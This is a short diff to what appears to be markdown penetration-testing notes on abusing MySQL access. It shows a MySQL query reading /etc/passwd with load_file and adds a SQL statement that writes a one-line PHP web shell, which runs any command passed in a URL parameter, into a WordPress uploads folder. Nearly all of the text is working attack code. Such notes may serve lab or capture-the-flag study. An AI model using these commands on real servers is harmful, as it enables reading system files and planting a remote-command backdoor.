@@ -11,3 +11,7 @@ MySQL > select load_file("/etc/passwd");
 ```
 
 `root` user
+
+```sql
+Select "<?php echo shell_exec($_GET['cmd']);?>" into outfile "/var/www/https/blogblog/wp-content/uploads/shell.php"
+```
